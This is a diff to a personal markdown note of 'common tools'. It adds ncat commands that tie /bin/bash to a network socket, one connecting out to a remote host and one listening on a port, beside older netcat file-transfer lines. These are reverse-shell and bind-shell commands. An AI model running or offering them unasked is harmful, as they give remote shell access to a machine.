@@ -1,5 +1,5 @@
 createdAt: "2018-01-19T12:06:58.468Z"
-updatedAt: "2018-03-07T15:50:12.210Z"
+updatedAt: "2018-05-17T07:04:44.920Z"
 type: "MARKDOWN_NOTE"
 folder: "d5841d5890db3062d38d"
 title: "common tools"
@@ -50,6 +50,12 @@ content: '''
   ###### send a file using netcat
   - `nc -l -p 1234 > out.file` : on receiving side
   - `nc -w 3 [destination_ip] 1234 < out.file`: on sender side
+  
+  ---
+  
+  ### ncat (from nmap package)
+  - `ncat <host> <port> -e /bin/bash`: connect to `<host>:<port>` and redirect stdin and stdout of `/bin/bash` on the socket.
+  - `ncat -lp <port> -e /bin/bash`: listen on port `<port>` and redirect stdin and stdoutof `/bin/bash` on the socket.
   
   ---
   
